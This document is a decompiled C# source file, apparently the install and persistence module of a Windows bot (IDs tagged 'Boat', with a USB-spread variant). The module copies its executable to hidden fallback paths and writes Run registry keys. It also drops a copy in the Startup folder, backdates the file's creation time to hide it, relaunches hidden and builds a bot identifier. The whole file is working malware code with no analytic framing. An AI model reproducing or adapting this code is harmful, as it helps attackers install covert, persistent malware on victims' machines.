using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using a.My;

namespace a;

[StandardModule]
internal sealed class StartUp
{
	public static void Start()
	{
		//IL_051c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0523: Expected O, but got Unknown
		checked
		{
			try
			{
				if (Config.Debug)
				{
					return;
				}
				if ((Operators.CompareString(Application.get_ExecutablePath(), Config.FilePath, false) == 0) | (Operators.CompareString(Application.get_ExecutablePath(), Config.ALTFilePath1, false) == 0) | (Operators.CompareString(Application.get_ExecutablePath(), Config.ALTFilePath2, false) == 0))
				{
					if (Operators.CompareString(Application.get_ExecutablePath(), Config.ALTFilePath1, false) == 0)
					{
						Config.FilePath = Config.ALTFilePath1;
						Config.FolderPath = Config.ALTFolderPath1;
						Config.UpdateFile = Config.ALTUpdateFile1;
					}
					if (Operators.CompareString(Application.get_ExecutablePath(), Config.ALTFilePath2, false) == 0)
					{
						Config.FilePath = Config.ALTFilePath2;
						Config.FolderPath = Config.ALTFolderPath2;
						Config.UpdateFile = Config.ALTUpdateFile2;
					}
					try
					{
						((ServerComputer)MyProject.Computer).get_Registry().SetValue(Config.RegStartup, Config.RegName, (object)Config.FilePath, RegistryValueKind.String);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					try
					{
						((ServerComputer)MyProject.Computer).get_Registry().SetValue(Config.ExtraRegStartup, Config.ExtraRegName, (object)Config.FilePath, RegistryValueKind.String);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					try
					{
						if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Application.get_StartupPath() + "\\" + Config.IDRegStartup))
						{
							Config.BotId = Encoding.ASCII.GetString(Convert.FromBase64String(((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(Application.get_StartupPath() + "\\" + Config.IDRegStartup)));
							return;
						}
						string text = Conversion.Int(VBMath.Rnd() * 1000000f).ToString();
						while (text.Length != 6)
						{
							text = Conversion.Int(VBMath.Rnd() * 1000000f).ToString();
						}
						try
						{
							if (DateTime.Compare(DateTime.Parse(Conversions.ToString(File.GetCreationTime(Application.get_ExecutablePath()))), DateTime.Parse("13.10.2009 18:15:51")) == 0)
							{
								((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(Application.get_StartupPath() + "\\" + Config.IDRegStartup, Convert.ToBase64String(Encoding.ASCII.GetBytes("|Boat|USB||" + text.ToString() + "|" + Config.BotVer.ToString() + "|" + ((ServerComputer)MyProject.Computer).get_Info().get_InstalledUICulture().IetfLanguageTag.ToString() + "|")), false);
							}
							else
							{
								((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(Application.get_StartupPath() + "\\" + Config.IDRegStartup, Convert.ToBase64String(Encoding.ASCII.GetBytes("|Boat|" + text.ToString() + "|" + Config.BotVer.ToString() + "|" + ((ServerComputer)MyProject.Computer).get_Info().get_InstalledUICulture().IetfLanguageTag.ToString() + "|")), false);
							}
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(Application.get_StartupPath() + "\\" + Config.IDRegStartup, Convert.ToBase64String(Encoding.ASCII.GetBytes("|Boat|" + text.ToString() + "|" + Config.BotVer.ToString() + "|" + ((ServerComputer)MyProject.Computer).get_Info().get_InstalledUICulture().IetfLanguageTag.ToString() + "|")), false);
							ProjectData.ClearProjectError();
						}
						Config.BotId = Encoding.ASCII.GetString(Convert.FromBase64String(((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(Application.get_StartupPath() + "\\" + Config.IDRegStartup)));
						return;
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						string text2 = Conversion.Int(VBMath.Rnd() * 1000000f).ToString();
						while (text2.Length != 6)
						{
							text2 = Conversion.Int(VBMath.Rnd() * 1000000f).ToString();
						}
						Config.BotId = "|NO-NAME|" + text2.ToString() + "|" + Config.BotVer.ToString() + "|" + ((ServerComputer)MyProject.Computer).get_Info().get_InstalledUICulture().IetfLanguageTag.ToString() + "|";
						ProjectData.ClearProjectError();
						return;
					}
				}
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Config.FilePath);
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Config.ALTFilePath1);
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Config.ALTFilePath2);
				}
				catch (Exception projectError7)
				{
					ProjectData.SetProjectError(projectError7);
					ProjectData.ClearProjectError();
				}
				Process[] processes = Process.GetProcesses();
				ListBox val = new ListBox();
				for (int i = 0; i != processes.Length - 1; i++)
				{
					try
					{
						val.get_Items().Add((object)processes[i].MainModule!.FileName!.ToLower());
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
					}
				}
				if (val.get_Items().Contains((object)Config.FilePath.ToLower()))
				{
					ProjectData.EndApp();
				}
				if (val.get_Items().Contains((object)Config.ALTFilePath1.ToLower()))
				{
					ProjectData.EndApp();
				}
				if (val.get_Items().Contains((object)Config.ALTFilePath2.ToLower()))
				{
					ProjectData.EndApp();
				}
				try
				{
					byte[] array = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllBytes(Application.get_ExecutablePath());
					try
					{
						if (!((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(Config.FolderPath))
						{
							((ServerComputer)MyProject.Computer).get_FileSystem().CreateDirectory(Config.FolderPath);
						}
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						ProjectData.ClearProjectError();
					}
					FileStream fileStream = new FileStream(Config.FilePath, FileMode.Create);
					fileStream.Write(array, 0, array.Length);
					fileStream.Close();
					if (Config.TryCopToStartFolder)
					{
						try
						{
							string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
							((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), folderPath + "\\" + Config.StartupFolderExeName);
							try
							{
							}
							catch (Exception projectError10)
							{
								ProjectData.SetProjectError(projectError10);
								ProjectData.ClearProjectError();
							}
						}
						catch (Exception projectError11)
						{
							ProjectData.SetProjectError(projectError11);
							ProjectData.ClearProjectError();
						}
					}
					try
					{
						((ServerComputer)MyProject.Computer).get_Registry().SetValue(Config.RegStartup, Config.RegName, (object)Config.FilePath, RegistryValueKind.String);
					}
					catch (Exception projectError12)
					{
						ProjectData.SetProjectError(projectError12);
						ProjectData.ClearProjectError();
					}
					try
					{
						File.SetCreationTime(Config.FilePath, DateTime.Now.AddYears(-3));
					}
					catch (Exception projectError13)
					{
						ProjectData.SetProjectError(projectError13);
						ProjectData.ClearProjectError();
					}
					Thread.Sleep(5000);
					Interaction.Shell(Config.FilePath, (AppWinStyle)2, false, -1);
					ProjectData.EndApp();
				}
				catch (Exception projectError14)
				{
					ProjectData.SetProjectError(projectError14);
					Config.FilePath = Config.ALTFilePath1;
					Config.FolderPath = Config.ALTFolderPath1;
					Config.UpdateFile = Config.ALTUpdateFile1;
					try
					{
						byte[] array2 = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllBytes(Application.get_ExecutablePath());
						try
						{
							if (!((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(Config.FolderPath))
							{
								((ServerComputer)MyProject.Computer).get_FileSystem().CreateDirectory(Config.FolderPath);
							}
						}
						catch (Exception projectError15)
						{
							ProjectData.SetProjectError(projectError15);
							ProjectData.ClearProjectError();
						}
						FileStream fileStream2 = new FileStream(Config.FilePath, FileMode.Create);
						fileStream2.Write(array2, 0, array2.Length);
						fileStream2.Close();
						if (Config.TryCopToStartFolder)
						{
							try
							{
								string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
								((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), folderPath2 + "\\" + Config.StartupFolderExeName);
								try
								{
								}
								catch (Exception projectError16)
								{
									ProjectData.SetProjectError(projectError16);
									ProjectData.ClearProjectError();
								}
							}
							catch (Exception projectError17)
							{
								ProjectData.SetProjectError(projectError17);
								ProjectData.ClearProjectError();
							}
						}
						try
						{
							((ServerComputer)MyProject.Computer).get_Registry().SetValue(Config.RegStartup, Config.RegName, (object)Config.FilePath, RegistryValueKind.String);
						}
						catch (Exception projectError18)
						{
							ProjectData.SetProjectError(projectError18);
							ProjectData.ClearProjectError();
						}
						try
						{
							File.SetCreationTime(Config.FilePath, DateTime.Now.AddYears(-3));
						}
						catch (Exception projectError19)
						{
							ProjectData.SetProjectError(projectError19);
							ProjectData.ClearProjectError();
						}
						Thread.Sleep(5000);
						Interaction.Shell(Config.FilePath, (AppWinStyle)2, false, -1);
						ProjectData.EndApp();
					}
					catch (Exception projectError20)
					{
						ProjectData.SetProjectError(projectError20);
						Config.FilePath = Config.ALTFilePath2;
						Config.FolderPath = Config.ALTFolderPath2;
						Config.UpdateFile = Config.ALTUpdateFile2;
						try
						{
							byte[] array3 = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllBytes(Application.get_ExecutablePath());
							try
							{
								if (!((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(Config.FolderPath))
								{
									((ServerComputer)MyProject.Computer).get_FileSystem().CreateDirectory(Config.FolderPath);
								}
							}
							catch (Exception projectError21)
							{
								ProjectData.SetProjectError(projectError21);
								ProjectData.ClearProjectError();
							}
							FileStream fileStream3 = new FileStream(Config.FilePath, FileMode.Create);
							fileStream3.Write(array3, 0, array3.Length);
							fileStream3.Close();
							if (Config.TryCopToStartFolder)
							{
								try
								{
									string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
									((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), folderPath3 + "\\" + Config.StartupFolderExeName);
									try
									{
									}
									catch (Exception projectError22)
									{
										ProjectData.SetProjectError(projectError22);
										ProjectData.ClearProjectError();
									}
								}
								catch (Exception projectError23)
								{
									ProjectData.SetProjectError(projectError23);
									ProjectData.ClearProjectError();
								}
							}
							try
							{
								((ServerComputer)MyProject.Computer).get_Registry().SetValue(Config.RegStartup, Config.RegName, (object)Config.FilePath, RegistryValueKind.String);
							}
							catch (Exception projectError24)
							{
								ProjectData.SetProjectError(projectError24);
								ProjectData.ClearProjectError();
							}
							try
							{
								File.SetCreationTime(Config.FilePath, DateTime.Now.AddYears(-3));
							}
							catch (Exception projectError25)
							{
								ProjectData.SetProjectError(projectError25);
								ProjectData.ClearProjectError();
							}
							Thread.Sleep(5000);
							Interaction.Shell(Config.FilePath, (AppWinStyle)2, false, -1);
							ProjectData.EndApp();
						}
						catch (Exception projectError26)
						{
							ProjectData.SetProjectError(projectError26);
							ProjectData.EndApp();
							ProjectData.ClearProjectError();
						}
						ProjectData.ClearProjectError();
					}
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception projectError27)
			{
				ProjectData.SetProjectError(projectError27);
				string text3 = Conversion.Int(VBMath.Rnd() * 1000000f).ToString();
				while (text3.Length != 6)
				{
					text3 = Conversion.Int(VBMath.Rnd() * 1000000f).ToString();
				}
				Config.BotId = "|NO-INSTALL|" + text3.ToString() + "|" + Config.BotVer.ToString() + "|" + ((ServerComputer)MyProject.Computer).get_Info().get_InstalledUICulture().IetfLanguageTag.ToString() + "|";
				ProjectData.ClearProjectError();
			}
		}
	}
}
